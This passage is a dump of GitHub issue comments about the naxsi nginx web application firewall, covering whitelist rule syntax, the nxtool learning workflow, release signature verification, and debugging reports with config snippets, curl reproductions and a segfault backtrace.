    "ihacku": "Ok, whitelist internal rules need be done in site's nginx conf, not in naxsi_core.rules.\nLike this\n            DeniedUrl \"/RequestDenied\";\nBasicRule wl:0 \"mz:$URL:/iis.aspx|ARGS|BODY|URL\";\n        BasicRule wl:10;\n        BasicRule wl:11;  \n        CheckRule \"$XSS >= 4\" BLOCK;\nPlease close this issue.\n. I'm interested in testing libinjection integration in production, what exactly shoud I do?\n. Ahh, I'm so noob, sorry.\n. Duplicate of https://github.com/nbs-system/naxsi/issues/249\n. ",
    "scollazo": "As dicussed on irc, --fmt-only is a better idea.\n. ",
    "gradew": "Hi,\nJust adding some feedback to this ticket: I had the exact same problem yesterday when trying to feed nxtool.py with --stdin: it goes into an infinite loop and keeps displaying \"start - stop\\n\".\nSame command with --file worked just fine, though.\n. Hi Cartogenic,\nI did have trouble as well ;-)\nHere's what I do to generate whitelists; like you said, nx_util is deprecated. You will need to use nxapi.py now, since you will only find nx_util in older packages, and the rules syntax may just break.\n- set up ES (Elasticsearch) and create an index called nxapi.\n- alter nxapi.json to make it point to your ES instance (IP or FQDN)\n- once you've generated enough error logs with nginx, run:  nxtool.py -c nxapi.json --file=/var/log/nginx/error.log (or whatever your error log file(s) is/are); this will feed all the NAXSI_FMT data into ES\n- BasicRule statements can then be generated using the following: nxtool.py -c nxapi.json -f --slack\nElasticsearch is basically a search engine that you can query/build using JSON.\nSetting it up is rather easy and fairly well explained on the offical website. You may want to also install \"head\", which is an Elasticsearch plugin that will give you some sort of GUI that you can use for basic operations (such as creating indexes).\nES is beyond the scope of this thread, but if you're having trouble setting it up, I'd be glad to help :)\n. ",
    "Cartogenic": "MainRule \"str:@@\" \"msg:double @@\" \"mz:BODY|URL|ARGS|$HEADERS_VAR:Cookie\" \"s:$SQL:4\" id:1017;\n@@ --> +4 points\nif you are using default ruleset then:\nCheckRule \"$SQL >= 8\" BLOCK;\nmeaning @@ alone won't block but will make request more suspicious. \nIf any other suspicious string like select|union|update|delete|insert|table|from|ascii|hex|unhex|drop (| = or) (each of these strings adds up another 4 points) is used in conjuction with @@, request is blocked.\n (4 + 4 = 8, 8 = BLOCK)\nVery smart system! +1 developer, you rock!\nIn the end, it blocks malicious queries using @@.\ntry it for yourself!\n@@ --> no block\nselect --> no block\n@@ select --> BLOCK\n. Thank you for all your help =)\nSorry for the very late response, I rarely check my mail, and got around the problem using the old white list tool.\n. Noted =) Thanks once again for all your help!\n. ",
    "ajrpayne": "Hi,\nThanks for the quick response. I am still not clear on what is happening based on your reply though.\nFor example, lets say %38 is somewhere within a cookie value. Since cookies are not decoded before being checked won't %38 trip rule 1315 in the cookie even though it is only single encoded and not double encoded? \n. ",
    "lizter": "I am currently experiencing an issue that I think is related to this. I use Naxsi in Nginx with a proxy pass to an Node Express app that store a session id in a cookie. The header starts like this: set-cookie: connect.sid=s%3AiKf4eH...\nI am new to Naxsi, and I am not sure whether it would be safe to try to whitelist this cookie.\n. Thank you for the reply. Do you have any tips on how I can do this? I tried to add BasicRule wl:1315 \"mz:HEADERS:cookie\";, but that gave me nginx: [emerg] Naxsi-Config : Incorrect line BasicRule wl:1315 (../naxsi-0.54/naxsi_src//naxsi_skeleton.c/477)... in /etc/nginx/naxsi.rules:13\n. ",
    "hugochinchilla": "Ok, I think I got the problem, naxsi does not allow to check the content of a file upload, am i right?\n. @buixor thanks for your clarification\n. ",
    "m0l1n": "You really have to install an ES cluster just to use the nxtool.py ? \nCan't we just use the tool on the naxsi log the way nx_util did it ?\n. Yes, it just sound quite heavy to me  :\n-\"Hey can I whitelist with naxsi?\"\n-\"Yeah you just need an ES cluster\"\nBut well it's a solution, but in that mind it would be great if you could\nmake some documentation about it, or at least a redirecting link to\nElasticSearch page ;)\nI mean whitelist is what make naxsi nice to use !\n2015-06-11 14:32 GMT+02:00 buixor notifications@github.com:\n\nHi,\nYes, nxtool requires ES.\nIt might sound annoying, but sqlite/mysql DB backend was too troublesome\nfor us to be able to procude decent learning.\nWe do not have plans for other DBs back-ends so far.\nOn Thu, Jun 11, 2015 at 12:11 PM, m0l1n notifications@github.com wrote:\n\nYou really have to install an ES cluster just to use the nxtool.py ?\nCan't we just use the tool on the naxsi log the way nx_util did it ?\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/191#issuecomment-111076640.\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/191#issuecomment-111116362.\n\n\nCordialement,\nMOLLARD Quentin,\nEtudiant en Master Informatique,\n\u00e0 l'IM2AG , Universit\u00e9 Joseph Fourier .\n. I don't have much time for now, but in 2-3 weeks I will work on ES and\nnaxpi to make thing work, will comment everything I do and try to put some\ndocumentation to guide user through it :)\n2015-06-11 15:06 GMT+02:00 buixor notifications@github.com:\n\n\"Cluster\" is a big word for a software you can launch standalone !\nBut yeah, I do understand the strugle, however - it takes what it takes :)\nNoted for the ElasticSearch suggestion in the documentation.\nIf you already have feedback or suggestions, they are welcome\nps: the wiki is open for editing by anyone !\nOn Thu, Jun 11, 2015 at 2:36 PM, m0l1n notifications@github.com wrote:\n\nYes, it just sound quite heavy to me :\n-\"Hey can I whitelist with naxsi?\"\n-\"Yeah you just need an ES cluster\"\nBut well it's a solution, but in that mind it would be great if you could\nmake some documentation about it, or at least a redirecting link to\nElasticSearch page ;)\nI mean whitelist is what make naxsi nice to use !\n2015-06-11 14:32 GMT+02:00 buixor notifications@github.com:\n\nHi,\nYes, nxtool requires ES.\nIt might sound annoying, but sqlite/mysql DB backend was too\ntroublesome\nfor us to be able to procude decent learning.\nWe do not have plans for other DBs back-ends so far.\nOn Thu, Jun 11, 2015 at 12:11 PM, m0l1n notifications@github.com\nwrote:\n\nYou really have to install an ES cluster just to use the nxtool.py ?\nCan't we just use the tool on the naxsi log the way nx_util did it ?\n\u2014\nReply to this email directly or view it on GitHub\n<\nhttps://github.com/nbs-system/naxsi/issues/191#issuecomment-111076640\n.\n\n\u2014\nReply to this email directly or view it on GitHub\n<https://github.com/nbs-system/naxsi/issues/191#issuecomment-111116362\n.\n\n\nCordialement,\nMOLLARD Quentin,\nEtudiant en Master Informatique,\n\u00e0 l'IM2AG , Universit\u00e9 Joseph Fourier .\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/191#issuecomment-111117409.\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/nbs-system/naxsi/issues/191#issuecomment-111125799.\n\n\nCordialement,\nMOLLARD Quentin,\nEtudiant en Master Informatique,\n\u00e0 l'IM2AG , Universit\u00e9 Joseph Fourier .\n. ",
    "ghost": "Hi there, \na year passed by.. Any updates on debian jessie + naxsi?\nThanks\n. Yep, compiled it myself aswell a dozen times. Just wondering why the debian guys kicked the package with jessie.\n. @f2ex what was the \"mistake\"?  I am having the same issue.... ",
    "avs262": "Disregard, RTFM...\n. ",
    "research4545": "thank for hug of response :D \nfinally i used specific $URL with BODY, \nBasicRule wl:0 \"mz:$URL:/ngx_pagespeed_beacon|BODY\";\ni can't understand why \"BasicRule wl:0 \"mz:$URL_X:^/ngx_pagespeed_beacon$|BODY\";\" not work. but in $BODY my problem was write ngxx instead of ngx.\n. ",
    "quantumpacket": "True, most people do get it from a repo, but for those who want to compile Nginx+NAXSI we definitely could use a way to verify it.\nSince NAXSI source is currently not being signed, how are the package maintainers for the repos verifying the source integrity before compiling?\nI'm currently not allowed to use NAXSI source per policy, because it's not signed. But if I get the package from the repo which is signed by the package maintainer (in this case Ubuntu) I am allowed to use it. Which doesn't seem secure if it's not being signed upstream.\nRegardless of IT sec policies, the paranoid side of me :eyes:  says it would be a great way for the NSA :shipit: to compromise source code and backdoor a production server.\n. ```\n$ git tag -v 0.54rc3\nobject e3e1ac843c049c116d600be3f79a560cd553efb3\ntype commit\ntag 0.54rc3\ntagger bui bui@nbs-system.com 1433504103 +0200\n0.54rc3, signed\ngpg: Signature made Fri 05 Jun 2015 07:35:03 AM EDT using RSA key ID 2685AED4\ngpg: Good signature from \"Naxsi Project (Key Used To Sign Code) tko@nbs-system.com\"\ngpg: WARNING: This key is not certified with a trusted signature!\ngpg:          There is no indication that the signature belongs to the owner.\nPrimary key fingerprint: 5FA3 5473 CA73 872A A973  1F5C 251A 28DE 2685 AED4\n```\n:+1:  Thanks!\nThe documentation should also be updated to show people how to verify Nginx and NAXSI if they choose to do so. I'll update the wiki to show the verification steps. Now only if all the repos signed their code :P\n. I updated https://github.com/nbs-system/naxsi/wiki/installation but it could use a 2nd pair of eyes to make sure I typed it all up correctly. Thanks for this awesome module!\n. I just tried to compile the latest release and my compile script failed due to the signature files no longer being archived as they were before. So either the docs need to be updated as they expect the file to be tar.gz.asc, or the previous file format used.\nBut the more important thing is I am getting a wrong signature for the current release:\n\nanon@anon:/tmp/naxsi$ gpg -v --verify 0.54.asc naxsi-0.54.tar.gz\ngpg: armor header: Version: GnuPG v1\ngpg: Signature made Tue 29 Sep 2015 08:41:13 AM EDT using RSA key ID 2685AED4\ngpg: using PGP trust model\ngpg: BAD signature from \"Naxsi Project (Key Used To Sign Code) tko@nbs-system.com\"\ngpg: binary signature, digest algorithm SHA1\nanon@anon:/tmp/naxsi$ gpg -v --verify 0.54.asc naxsi-0.54.zip\ngpg: armor header: Version: GnuPG v1\ngpg: Signature made Tue 29 Sep 2015 08:41:13 AM EDT using RSA key ID 2685AED4\ngpg: using PGP trust model\ngpg: BAD signature from \"Naxsi Project (Key Used To Sign Code) tko@nbs-system.com\"\ngpg: binary signature, digest algorithm SHA1\n\nCan you verify on your end this is the case using the current release archive and signature found here? The git signature on the other hand is verifying.\nAlso, you should be using SHA2 and not SHA1 as Nginx is doing so, as it's no longer considered secure. You can check out this for instructions for migrating your keys to SHA2.\n. @buixor It's been a week was wondering if anybody had the chance to verify the signature mismatch. If this requires a new issue to be opened let me know. I figured it best fit in this already on-topic one. Thanks.\nSomething like this should be addressed as soon as possible as it could indicate either a tampered with source archive, or a corrupted one. Neither of which should be available for people to download and use.\n. Thanks! Any news on the bad signature for the current release?\n. @buixor \nIs there a reason why the source verification section was removed from the new wiki page? I was going to go update the key retrieval to use full keys to prevent key collisions and saw it was removed. Also, any update on when you'll change to SHA-2 as mentioned here?. Is there no way to allow escaping of the separator?\nconf\nBasicRule wl:1310,1311 \"mz:$URL_X:(.*)/checkout/(.*)|$BODY_VAR_X:^(billing\\|giftmessage\\|payment\\|shipping\\|street\\|options)$|NAME\";\nNot sure how Nginx handles backslashes in config files, but it might require double escaping so Nginx sees it as a literal backslash.\n. One last suggestion, I'm probably wrong anyways.\nCan we not use a comma as the matchzone separator instead of a pipe? The score section already uses commas as its separator. I see a conflict with a comma being much less likely as it has no special meaning in PCRE, and it's not going to be as useful as allowing the use of a pipe in a regex.\n. @Hard-Shade see latest posts for https://github.com/nbs-system/naxsi/issues/201\n. ",
    "exZ": "Ow thank you @blotus. How do I setup different set of rules based on location? \n. ",
    "stevepeak": "Hey @buixor this build result is here: https://codecov.io/github/nbs-system/naxsi?ref=584eed613fdd9050aa2e4191652a264f9c949f1d\nYou can ignore the usr/include path by typing in usr/include/* into Features -> Ignore FIles\n. ",
    "F1nny": "Hi guys, thank you for the quick replies and work! I'll give it a shot pretty soon here with the latest commit and let you guys know if that resolved it otherwise will send some samples for further investigation, gotta love python encoding haha.\n. Hey guys,\nLooks like that resolved the issue!:) Thanks to you both for all your great work on naxsi, and thanks for getting this figured so quickly!\n. ",
    "Keithsc": "Hi,\nThanks for the quick reply. I was trying to get syslog to work earlier today but was having issues so decided to just use log files instead. I will raise a separate issue about the syslog problems I was having. Thanks Keith.\n\nFrom: blotus [notifications@github.com]\nSent: 19 August 2015 13:43\nTo: nbs-system/naxsi\nCc: Scott Keith (NATIONAL SERVICES SCOTLAND)\nSubject: Re: [naxsi] Seperate logfile confusion ? (#215)\nHi,\nThis option is no longer present. It was briefly available only in the repo (no release), but we discovered a few bugs in it, allowing to crash the nginx child. We chose to remove the feature for the time being, as it is not really important (and you can emulate this using syslog for example, by making nginx log to syslog, and configuring syslog to send the logs to differents files based on the log line).\n\ufffd\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/issues/215#issuecomment-132577718.\n\nThis message may contain confidential information. If you are not the intended recipient please inform the\nsender that you have received the message in error before deleting it.\nPlease do not disclose, copy or distribute information in this e-mail or take any action in reliance on its contents:\nto do so is strictly prohibited and may be unlawful.\nThank you for your co-operation.\nNHSmail is the secure email and directory service available for all NHS staff in England and Scotland\nNHSmail is approved for exchanging patient data and other sensitive information with NHSmail and GSi recipients\nNHSmail provides an email address for your career in the NHS and can be accessed anywhere\n\n. Thanks for the reply. I have a working solution in place just now using logstash to collect the logs on a central server, that then writes them to disk from where I run nxtool.  When I get the change I will have another shot at getting nxtool to work with syslog.\nThanks\nkeith\n. Hi, I managed to make get it working by changing the following lines in nxtool.py\nes = elasticsearch.Elasticsearch(cfg.cfg[\"elastic\"][\"host\"],\n        use_ssl=use_ssl,\n)\nhttps://elasticsearch-py.readthedocs.io/en/master/    < Scroll down to the SSL and Authentication\nyou need to add the user, secret and you probably also need to add a \"verify_certs=false,\"\nes = Elasticsearch(\n    ['localhost', 'otherhost'],\n    http_auth=('user', 'secret'),\n    port=443,\n    use_ssl=True\n)\nOn 12/10/17 09:43, maxidea wrote:\nAny update for this issue? Same problem found on my production after use X-Pack security in Kibana & ElasticSearch. I believe a update for support elastic's username & password setup in nxapi.json is necessary.\n\u2014\nYou are receiving this because you authored the thread.\nReply to this email directly, view it on GitHubhttps://github.com/nbs-system/naxsi/issues/399#issuecomment-336062219, or mute the threadhttps://github.com/notifications/unsubscribe-auth/AFUXkO-Lw2ve92p27u1qKgYZPea_ctuwks5srdFCgaJpZM4PqZ_Z.\n\nThis message may contain confidential information. If you are not the intended recipient please inform the\nsender that you have received the message in error before deleting it.\nPlease do not disclose, copy or distribute information in this e-mail or take any action in relation to its contents. To do so is strictly prohibited and may be unlawful. Thank you for your co-operation.\nNHSmail is the secure email and directory service available for all NHS staff in England and Scotland. NHSmail is approved for exchanging patient data and other sensitive information with NHSmail and other accredited email services.\nFor more information and to find out how you can switch, https://portal.nhs.net/help/joiningnhsmail\n. ",
    "123BLiN": "Hi! I have next stats (real data removed):\n``` bash\nroot@t-nlb-d:~# nxtool.py -x\nsize :1000\nWhitelist(ing) ratio :\nfalse 100.0 % (total:3347/3347)\nTop servers :\nxxxxx 36.6 % (total:1225/3347)\nyyyyy 22.26 % (total:745/3347)\nzzzzz 8.07 % (total:270/3347)\n...\nTop URI(s) :\n/ffdgdfgd.dll 53.78 % (total:1800/3347)\n/gdfgd.aspx 32.42 % (total:1085/3347)\n/Admin/Contents/List 5.68 % (total:190/3347)\n/Service1/Service.asmx 2.54 % (total:85/3347)\n/> 1.05 % (total:35/3347)\n/service1/fffservice.asmx 0.75 % (total:25/3347)\n/CreditScoreWebService.asmx 0.75 % (total:25/3347)\n/signalr/poll 0.6 % (total:20/3347)\n/signalr/connect 0.6 % (total:20/3347)\n/Admin/Contents/Remove/1527 0.45 % (total:15/3347)\n/>>> 0.36 % (total:12/3347)\nTop Zone(s) :\nBODY 60.35 % (total:2020/3347)\nARGS 32.42 % (total:1085/3347)\nBODY|NAME 5.83 % (total:195/3347)\nURL 1.4 % (total:47/3347)\nTop Peer(s) :\nxx.xxx.xxx.xx 38.9 % (total:1302/3347)\nyy.yyy.yyy.yy 36.6 % (total:1225/3347)\n```\nsame with -s :(\n``` bash\nroot@t-nlb-d:~# nxtool.py -f --slack -s xxx.test-yyy.org #the real host name from the stats\nsize :1000\nroot@t-nlb-d:~#\n```\n. You are the best from the best!\nlooks like some setup.py problem, but I'm not familiar with python.\nI may check something if you wish.\nI'v changed relative path to /usr/local/nxapi/tpl/ and /usr/local/nxapi/nx_datas/country2coords.txt in /usr/local/etc/nxapi.json:\nbash\n\"naxsi\" : {\n \"rules_path\" : \"/etc/nginx/naxsi_core.rules\",\n \"template_path\" : [ \"/usr/local/nxapi/tpl/\"],\n \"geoipdb_path\" : \"/usr/local/nxapi/nx_datas/country2coords.txt\"\n},\nand all works.\nThank you very much again. \n. This is so sad :(\n. ",
    "steverweber": "Available only in >= 0.52\ni likly running old version... :(\n. please add some help to the whitelists wiki, regarding minimum version URL_X is supported.\nhttps://github.com/nbs-system/naxsi/wiki/whitelists\nBasicRule wl:0 \"mz:$URL_X:^/queries.*$\";\n...\n2015/09/21 12:16:13 [emerg] 31957#0: Naxsi-Config : Incorrect line BasicRule wl:0 (/build/nginx-vKB75B/nginx-1.4.6/debian/modules/naxsi/naxsi_src/naxsi_skeleton.c/393)... in /etc/nginx/sites-enabled/default:138\nthanks\n. i get the same error with:\nBasicRule wl:0 \"mz:$URL_X:^/foo$|ARGS\";\n...\n2015/09/23 11:17:05 [emerg] 11130#0: Naxsi-Config : Incorrect line BasicRule wl:0 (/build/nginx-vKB75B/nginx-1.4.6/debian/modules/naxsi/naxsi_src/naxsi_skeleton.c/393)... in /etc/nginx/sites-enabled/default:154\nroot@oat-fe-1:~# nginx -V\nnginx version: nginx/1.4.6 (Ubuntu)\nbuilt by gcc 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04) \nTLS SNI support enabled\nconfigure arguments: --with-cc-opt='-g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security -D_FORTIFY_SOURCE=2' --with-ld-opt='-Wl,-Bsymbolic-functions -Wl,-z,relro' --prefix=/usr/share/nginx --conf-path=/etc/nginx/nginx.conf --http-log-path=/var/log/nginx/access.log --error-log-path=/var/log/nginx/error.log --lock-path=/var/lock/nginx.lock --pid-path=/run/nginx.pid --http-client-body-temp-path=/var/lib/nginx/body --http-fastcgi-temp-path=/var/lib/nginx/fastcgi --http-proxy-temp-path=/var/lib/nginx/proxy --http-scgi-temp-path=/var/lib/nginx/scgi --http-uwsgi-temp-path=/var/lib/nginx/uwsgi --with-debug --with-pcre-jit --with-ipv6 --with-http_ssl_module --with-http_stub_status_module --with-http_realip_module --without-mail_pop3_module --without-mail_smtp_module --without-mail_imap_module --without-http_uwsgi_module --without-http_scgi_module --add-module=/build/nginx-vKB75B/nginx-1.4.6/debian/modules/naxsi/naxsi_src --add-module=/build/nginx-vKB75B/nginx-1.4.6/debian/modules/nginx-cache-purge --add-module=/build/nginx-vKB75B/nginx-1.4.6/debian/modules/nginx-upstream-fair\nlikly this package\nhttps://bugs.launchpad.net/ubuntu/trusty/amd64/nginx-naxsi/1.4.6-1ubuntu3.1\n... not sure what version of naxsi it using.\n. ",
    "studersi": "Hi,\nI had similar problems. I added some additional information to the nxapi readme file.\nThe pull request is pending, but have a look here, maybe this helps:\nhttps://github.com/nbs-system/naxsi/pull/229/files\n. ",
    "FlorinAsavoaie": "I just stripped it but it happens if I enable it for the location only. If naxsi is not enabled for the location but just built into nginx, the bug does not occur. However, it doesn't matter if it is in learning mode or not.\n. ``` nginx\nlocation /myapp {\n  # Naxsi config\n  LearningMode;\n  SecRulesEnabled;\nDeniedUrl \"/RequestDenied\";\nCheckRule \"$SQL >= 8\" BLOCK;\n  CheckRule \"$RFI >= 8\" BLOCK;\n  CheckRule \"$TRAVERSAL >= 4\" BLOCK;\n  CheckRule \"$EVADE >= 4\" BLOCK;\n  CheckRule \"$XSS >= 8\" BLOCK;\nauth_request /auth;\n  proxy_pass http://some-upstream;\n}\nlocation = /auth {\n  proxy_method GET;\n  proxy_pass_request_body off;\n  proxy_pass_request_headers off;\n  if ($cookie_auth) {\n    set $app_auth \"Token $cookie_auth\";\n  }\n  if ($http_authorize) {\n    set $app_auth $http_authorize;\n  }\n  proxy_set_header Authorize $app_auth;\n  proxy_set_header Host $host;\n  proxy_set_header Content-Length \"\";\n  proxy_cache proxyCacheAuth;\n  proxy_cache_key $remote_addr$host$app_auth;\n  proxy_cache_valid any 15m;\n  proxy_pass http://authupstream/random/url;\n}\n```\n. Yeah, it probably will. I wasn't sure if it is really a pretty nasty problem or it is just me not having enough skills :)...\n. I rather think that both naxsi and the other module do something that they are not supposed to do in the wrong phase. It is possible that this changed at some point in nginx but it doesn't change the fact that the nginx devs do not recommend doing that. We will give it a try as soon as we can and confirm.\n. Hi, how are you doing?\n0.55 is out \ud83d\udc83 Time for party!\nBut we'd also appreciate some more input on this one.\nThanks,. We switched to mod_security :(. ",
    "andreidotnet": "Hello,\nI will provide soon a full configuration that is confirmed from our side to have this issue.\nThis has not been abandoned from our side :)\n. After investigating further we've tracked the bug to the size of the request, it seems to be working until up to 1024. \nThe following should not work with your config :\ndd if=/dev/zero bs=1 count=1024 | curl -vvk 'http://127.0.0.1:4242/myapp' -X PUT --data-binary @-\nThe following should work, with your config :\ndd if=/dev/zero bs=1 count=10 | curl -vvk 'http://127.0.0.1:4242/myapp' -X PUT --data-binary @-\nNote that if you comment #SecRulesEnabled; and retry the request with a content length greater than 1024, it will work.\nPlease let us know if you were able to reproduce the issue with the settings you have posted above.\n. Just noticed, we're using naxsi-0.54rc3. Will test the latest release soon and confirm if we see the same problem there.\n. So we can take this as a confirmation that you were able to reproduce the issue ? :)\n. Hello, \nAny luck so far with the discovered issue ?\n. Hello,\nSorry for the late reply, got caught up with other stuff.\nTested today with nginx 1.9.9 with the requested configuration mentioned previously.\n\n/nginx/usr/sbin/nginx -V\nnginx version: nginx/1.9.9\nbuilt by gcc 4.4.7 20120313 (Red Hat 4.4.7-16) (GCC) \nbuilt with OpenSSL 1.0.1e-fips 11 Feb 2013\nTLS SNI support enabled\nconfigure arguments: --add-module=../ngx_devel_kit --add-module=../form-input-nginx-module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/run/nginx.pid --lock-path=/var/run/nginx.lock --http-client-body-temp-path=/var/cache/nginx/client_temp --http-proxy-temp-path=/var/cache/nginx/proxy_temp --user=nginx --group=nginx --with-http_ssl_module --with-http_realip_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_stub_status_module --with-http_auth_request_module --with-stream --with-file-aio --with-http_v2_module --without-http_fastcgi_module --without-http_scgi_module --without-http_uwsgi_module --with-cc-opt='-O2 -g -pipe -Wall -Wp,-D_FORTIFY_SOURCE=2 -fexceptions -fstack-protector --param=ssp-buffer-size=4 -m64 -mtune=generic'\n\nThe nginx config \n\nlocation /myapp {\n# ensure client_max_body_size == client_body_buffer_size\n client_max_body_size 100k;\n client_body_buffer_size 100k;\n set_form_input $data;    # read \"data\" field into $data\n set_form_input $foo foo; # read \"foo\" field into $foo\nauth_request /auth;\n proxy_pass http://77.153.128.117/;\n proxy_set_header Host www.google.fr;\n}\n\nWith \n\ndd if=/dev/zero bs=1 count=10 | curl -vvk 'http://127.0.0.1:4242/myapp' -X PUT --data-binary @-\n\nwe get an ok response\nWith\n\ndd if=/dev/zero bs=1 count=1024 | curl -vvk 'http://127.0.0.1:4242/myapp' -X PUT --data-binary @-\n\nthe request gets stuck\n\n1024+0 records in\n1024+0 records out\n1024 bytes (1.0 kB) copied, 0.00100387 s, 1.0 MB/s\n About to connect() to 127.0.0.1 port 4242 (#0)\n   Trying 127.0.0.1... connected\n* Connected to 127.0.0.1 (127.0.0.1) port 4242 (#0)\n\nPUT /myapp HTTP/1.1\nUser-Agent: curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.19.1 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2\nHost: 127.0.0.1:4242\nAccept: /\nContent-Length: 1024\nContent-Type: application/x-www-form-urlencoded\n^C\n\n\nWhen i get some time i'll try and test it out with previous nginx version to try and trace down the last version this worked ok .. if that helps.\n. Did some more testing with multiple nginx version. We can reproduce the issue describe in the previous post even in nginx 1.5.4 (first version with http_auth_request_module\nWithout  http_auth_request_module, the request works as expected even in the latest nginx builds.\nIt's starting to look like http_auth_request_module might be the issue.\n. Heya buixor,\nDid you manage to find any news regarding this issue ? Have not noticed any activity on the ML regarding this topic.\n. ",
    "defanator": "Any success with this one so far?. Well, don't be surprised if you'll see the same behavior with (lib)modsecurity. :)\nhttps://github.com/SpiderLabs/ModSecurity-nginx/issues/130\nhttps://github.com/SpiderLabs/ModSecurity-nginx/pull/131. ",
    "dani": "Guess I have somehow the same, or a similar/related issue. Running nginx 1.15.6 and naxsi 0.56. When naxsi is enabled, even in learning mode, some POST requests just hang. I haven't isolated exactly which ones, but apparently, it can affect requests < 1024. I'll try to get some more info and a simple reproducer. For now, I can confirm the issue is only present when I protect the location with auth_request. I'm using Lemonldap::NG handler (see configuration example here: https://lemonldap-ng.org/documentation/latest/configvhost#reverse_proxy1)\nAs soon as I remove the auth_request part, everything is working again.. Has something like https://github.com/SpiderLabs/ModSecurity-nginx/pull/131/commits/1cd54842a58485fc4b50a7a4fdb1045fc2a4a844 been applied on NAXSI ?. I'd be happy to give it a try, if you can show me a commit. I have a setup where I can easily reproduce the issue.. ",
    "selivan": "``\ngdb /usr/sbin/nginx -c /var/lib/nginx/cores/core\n...\nReading symbols from /usr/sbin/nginx...Reading symbols from /usr/lib/debug/.build-id/98/189920b31b8739442099c12774ed5f5a5e04f7.debug...done.\ndone.\n[New LWP 20339]\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\nCore was generated bynginx: worker process                           '.\nProgram terminated with signal SIGSEGV, Segmentation fault.\n0  0x00007feb1dabaf25 in nx_find_wl_in_hash (mstr=mstr@entry=0x7feb1f4449e8, cf=cf@entry=0x7feb1f049018, zone=zone@entry=HEADERS)\nat /home/selivan/work/naxsi/nginx-1.9.5-custom/debian/modules/naxsi/naxsi_src//naxsi_runtime.c:352\n\n352         mstr->data[i] = tolower(mstr->data[i]);\n```\nBacktrace:\n```\n(gdb) bt\n0  0x00007feb1dabaf25 in nx_find_wl_in_hash (mstr=mstr@entry=0x7feb1f4449e8, cf=cf@entry=0x7feb1f049018, zone=zone@entry=HEADERS)\nat /home/selivan/work/naxsi/nginx-1.9.5-custom/debian/modules/naxsi/naxsi_src//naxsi_runtime.c:352\n\n1  0x00007feb1dabb4ca in ngx_http_dummy_is_rule_whitelisted_n (req=req@entry=0x7feb1f443c90, cf=cf@entry=0x7feb1f049018,\nr=r@entry=0x7feb1f030178, name=name@entry=0x7feb1f4449e8, zone=zone@entry=HEADERS, target_name=target_name@entry=0)\nat /home/selivan/work/naxsi/nginx-1.9.5-custom/debian/modules/naxsi/naxsi_src//naxsi_runtime.c:641\n\n2  0x00007feb1dabcad5 in ngx_http_apply_rulematch_v_n (r=r@entry=0x7feb1f030178, ctx=ctx@entry=0x7feb1f45dff8, req=req@entry=0x7feb1f443c90,\nname=name@entry=0x7feb1f4449e8, value=value@entry=0x7feb1f4449f8, zone=zone@entry=HEADERS, nb_match=1, target_name=target_name@entry=0)\nat /home/selivan/work/naxsi/nginx-1.9.5-custom/debian/modules/naxsi/naxsi_src//naxsi_runtime.c:1049\n\n3  0x00007feb1dabd40f in ngx_http_basestr_ruleset_n (pool=, name=name@entry=0x7feb1f4449e8, value=value@entry=0x7feb1f4449f8,\nrules=0x7feb1f01ce20, req=req@entry=0x7feb1f443c90, ctx=ctx@entry=0x7feb1f45dff8, zone=zone@entry=HEADERS)\nat /home/selivan/work/naxsi/nginx-1.9.5-custom/debian/modules/naxsi/naxsi_src//naxsi_runtime.c:1429\n\n4  0x00007feb1dabd7f3 in ngx_http_dummy_headers_parse (main_cf=main_cf@entry=0x7feb1f008e08, cf=cf@entry=0x7feb1f049018,\nctx=ctx@entry=0x7feb1f45dff8, r=r@entry=0x7feb1f443c90)\nat /home/selivan/work/naxsi/nginx-1.9.5-custom/debian/modules/naxsi/naxsi_src//naxsi_runtime.c:2130\n\n5  0x00007feb1dabef8e in ngx_http_dummy_data_parse (ctx=ctx@entry=0x7feb1f45dff8, r=r@entry=0x7feb1f443c90)\nat /home/selivan/work/naxsi/nginx-1.9.5-custom/debian/modules/naxsi/naxsi_src//naxsi_runtime.c:2154\n\n6  0x00007feb1dac1020 in ngx_http_dummy_access_handler (r=0x7feb1f443c90)\nat /home/selivan/work/naxsi/nginx-1.9.5-custom/debian/modules/naxsi/naxsi_src//naxsi_skeleton.c:1247\n\n7  0x00007feb1da5c743 in ngx_http_core_rewrite_phase (r=0x7feb1f443c90, ph=0x7feb1f0ca1f8) at src/http/ngx_http_core_module.c:894\n8  0x00007feb1da57f05 in ngx_http_core_run_phases (r=r@entry=0x7feb1f443c90) at src/http/ngx_http_core_module.c:840\n9  0x00007feb1da57ff7 in ngx_http_handler (r=r@entry=0x7feb1f443c90) at src/http/ngx_http_core_module.c:823\n10 0x00007feb1da6401e in ngx_http_process_request (r=0x7feb1f443c90) at src/http/ngx_http_request.c:1901\n11 0x00007feb1da95958 in ngx_http_v2_run_request (r=0x7feb1f443c90) at src/http/v2/ngx_http_v2.c:3445\n12 ngx_http_v2_state_header_complete (h2c=0x7feb1f3de700, pos=0x7feb1f12ab33 \"\", end=0x7feb1f12ab33 \"\") at src/http/v2/ngx_http_v2.c:1704\n13 0x00007feb1da96ad1 in ngx_http_v2_state_header_block (h2c=0x7feb1f3de700, pos=0x7feb1f12ab33 \"\", end=0x7feb1f12ab33 \"\")\nat src/http/v2/ngx_http_v2.c:1266\n\n14 0x00007feb1da92e6d in ngx_http_v2_read_handler (rev=0x7feb1f0fe790) at src/http/v2/ngx_http_v2.c:357\n15 0x00007feb1da4d2d1 in ngx_epoll_process_events (cycle=0x7feb1f005020, timer=, flags=)\nat src/event/modules/ngx_epoll_module.c:822\n\n16 0x00007feb1da43a7a in ngx_process_events_and_timers (cycle=cycle@entry=0x7feb1f005020) at src/event/ngx_event.c:242\n17 